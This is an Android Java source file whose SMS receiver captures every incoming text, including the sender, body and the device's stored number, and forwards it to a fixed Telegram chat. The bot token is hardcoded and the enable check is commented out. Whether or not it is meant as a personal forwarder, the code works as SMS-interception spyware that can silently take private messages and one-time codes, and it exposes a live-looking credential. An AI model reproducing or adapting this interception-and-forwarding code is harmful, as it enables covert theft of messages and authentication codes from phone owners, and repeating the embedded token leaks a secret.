package com.example.smsproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.pengrad.telegrambot.Callback;
import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.request.SendMessage;
import com.pengrad.telegrambot.response.SendResponse;

import java.io.IOException;

public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static long time = -1;

    @Override
    public void onReceive(Context context, Intent intent) {
        //boolean status = context.getSharedPreferences("prefs",Context.MODE_PRIVATE).getBoolean("status",false);
        //if(!status) return;
        if (intent.getAction().equals(SMS_RECEIVED)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                // get sms objects
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return;
                }
                // large message might be broken into many
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
                if (time == -1) time = messages[messages.length - 1].getTimestampMillis();
                else {
                    if (time == messages[messages.length - 1].getTimestampMillis()) {
                        time = messages[messages.length - 1].getTimestampMillis();
                        return;
                    }
                    time = messages[messages.length - 1].getTimestampMillis();
                }
                //Log.d("TAG",messages.length+" ");
                String sender = messages[messages.length - 1].getOriginatingAddress();
                String message = "";
                for(SmsMessage i:messages) message += i.getMessageBody();
                 String phoneNumber = context.getSharedPreferences("prefs",Context.MODE_PRIVATE).getString("phone","");
                String ans = "Номер получателя: "+phoneNumber
                        +"\n"
                        +"Номер отправителя: "+sender
                        +"\n"
                        +"Текст сообщения: "+message;
                //Toast.makeText(context, ans, Toast.LENGTH_SHORT).show();
                Log.d("TAG",messages[messages.length-1].getMessageBody()+" "+messages.length);
                Log.d("TAG",ans);
                TelegramBot bot = new TelegramBot("5509909428:AAFqb3I3MAI3g2cT3s8Ubm_-3SamP9SDXXM");
                bot.execute(new SendMessage(1838053541L, ans), new Callback<SendMessage, SendResponse>() {
                    @Override
                    public void onResponse(SendMessage request, SendResponse response) {
                        Log.d("TAG","SuCCESS");
                    }

                    @Override
                    public void onFailure(SendMessage request, IOException e) {

                    }
                });
            }
        }
    }
    private boolean check(SmsMessage a, SmsMessage b) {
        b.getTimestampMillis();
        if(a.getOriginatingAddress().equals(b.getOriginatingAddress()) && a.getMessageBody().equals(b.getMessageBody())) return  true;
        return false;
    }
}